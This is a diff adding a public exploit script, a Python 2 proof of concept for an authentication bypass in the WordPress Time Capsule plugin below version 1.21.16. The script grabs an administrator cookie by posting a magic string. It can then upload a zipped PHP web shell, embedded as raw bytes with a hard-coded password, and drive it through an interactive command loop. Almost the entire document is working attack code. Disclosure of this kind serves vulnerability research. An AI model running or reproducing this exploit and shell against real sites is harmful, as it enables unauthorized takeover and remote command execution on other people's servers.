@@ -1,0 +1,58 @@
+# Exploit Title: Wordpress Time Capsule Plugin 1.21.16 - Authentication Bypass
+# Date: 2020-01-16
+# Exploit Author: B. Canavate 
+# Vendor Homepage: https://wptimecapsule.com/
+# Software Link: https://wptimecapsule.com/
+# Version:  Wordpress Time Capsule Plugin < 1.21.16
+# Tested on: LAMP stack with most recent Wordpress
+
+
+
+---- code below ----
+
+
+# PoC by: B. Canavate 
+# Based on the research done by the fine people at: https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/
+# GitHub repo with breakdown: https://github.com/SECFORCE/WPTimeCapsulePOC
+
+
+import requests
+import sys
+
+
+if len(sys.argv) == 1:
+	print "Usage:  poc.py http://127.0.0.1/ - Get Admin cookie"
+	print " poc.py http://127.0.0.1/ shell - Get Admin Cookie + Upload a shell on /wp-content/plugins/shell/shell.php "
+	print " Shell usage: /shell.php?pass=mak3ithapp3n&cmd=COMMAND"
+else:
+	url = sys.argv[1]
+	session = requests.Session()
+	rawBody = "IWP_JSON_PREFIX"
+	headers = {"Referer":url}
+	response = session.post(url, data=rawBody, headers=headers, verify=False)
+	for cookie in response.cookies:
+		if "logged" in cookie.name:
+			cookieadmin = cookie
+	response2 = session.get(url+"wp-admin/index.php", headers=headers, cookies = response.cookies, verify=False)
+	if "Dashboard" in response2.content:
+		print "This is the cookie that  you are looking for :-)"
+		print cookieadmin.name+":"+cookieadmin.value
+
+		if len(sys.argv) == 3 and sys.argv[2] == "shell":
+			response = session.get(url+"/wp-content/plugins/shell/shell.php?pass=mak3ithapp3n&cmd=",verify=False)
+			if response.status_code != 200 :
+				paramsGet = {"action":"upload-plugin"}
+				paramsPost = {"_wpnonce":"1ef2140910","_wp_http_referer":"/wp-admin/plugin-install.php","install-plugin-submit":"Install Now"}
+				paramsMultipart = [('pluginzip', ('shell.zip', "PK\x03\x04\x14\x03\x00\x00\x08\x00ra0P\xf2\x0f\x1d\xad\xe2\x00\x00\x00j\x01\x00\x00\x09\x00\x00\x00shell.php\x85\x8d1O\xc30\x10\x85\xe7\xfaW\x9c\xaa\xaaM:4\xa0n\x86P\xa1\x10\x24\x18\xa0\x24\x94\x05!d\xdc\x0b\xb6\x88c+\xe7\x0c\x15\xea\x7f\xc7\xc9\x80\xaav\xe8-\xa7\xbb\xf7\xbd\xf7\xaeWN9\x06a\x92\xf9\xb0\xd6u\xf7\xad\x1bx\x12\x069\x94yv\xff\\d9\xacm\x06\xa5\xc2\xba>d6\xc5\x03\x07\xe5\xbd\x23\x9e\x24\x84\xb2\xb2\xad\xc4\x85\xb4f\x80\xee\x90d\xab\x9d\xd7\xb6\xe1\xf0\xd8\x91\x07\x01(h\x07\xf4\x9fs\xdbye[\x0e_\xc1\xa8\x86\xcf\x1b\xb64\x18.\x16\x97\x07\xc8\x99\xaay\xc2\x180\xd0U\xa4\x89\xd0G\x93\xcf\"\x7f\xd9\xe4\xe5\xeb\xfbL\x9a\xed\xec\x23\x86\xe9\x14N\x24'\x88\x82\x16\xff\xb2\x91\xae\xe0T\x814\x85\xb1\x11?K\xed\x95pn\xd9\x8c{t4\x09\x91\x90\xc2q\xc7U\x90hG\x1eM\xd4\x13q\x7fo5\x86\xb5g{\xb6\xbaa\x7fPK\x01\x02?\x03\x14\x03\x00\x00\x08\x00ra0P\xf2\x0f\x1d\xad\xe2\x00\x00\x00j\x01\x00\x00\x09\x00\x24\x00\x00\x00\x00\x00\x00\x00 \x80\xb4\x81\x00\x00\x00\x00shell.php\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\x00LE\x19f\xcc\xd5\x01\x00LE\x19f\xcc\xd5\x01\x00LE\x19f\xcc\xd5\x01PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00[\x00\x00\x00\x09\x01\x00\x00\x00\x00", 'application/zip'))]
+				headers = {"Origin":url,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0","Referer":url+"/wp-admin/plugin-install.php","Connection":"close","Accept-Encoding":"gzip, deflate","DNT":"1","Accept-Language":"en-GB,en;q=0.5"}
+				cookies = {"wordpress_test_cookie":"WP+Cookie+check","wordpress_5c016e8f0f95f039102cbe8366c5c7f3":"secforce%7C1579345389%7CVEj3PYaEDRwiYHj9dvd3H2813BfDsqNxAJQyF0N4nOa%7Ccd8ab0bf244d404dc2b3ec55335545553a8017c254357f76b061345dfa751545","wordpress_logged_in_5c016e8f0f95f039102cbe8366c5c7f3":"secforce%7C1579345389%7CfoMJPKzwmHvHzKkdwvUcxUIXU327HQWR6Lrv1oP6qzA%7C2531f7ca8075fd9e0a56293dd7a627b2de1ddfe49ff34be9f0835e2a5e4cccb4","wp-settings-time-1":"1579176444"}
+				response = session.post(url+"/wp-admin/update.php", data=paramsPost, files=paramsMultipart, params=paramsGet, headers=headers, cookies=cookies)
+			print ("Now you have a shell! ")
+			command = ""
+			while(1 and (command != "exit")):
+				command = str(raw_input())
+				response = session.get(url+"/wp-content/plugins/shell/shell.php?pass=mak3ithapp3n&cmd="+command, verify=False)
+				print(response.content)
+			print "Remember to delete the shell.php :-)"
+	else:
+		print "There was an error :("
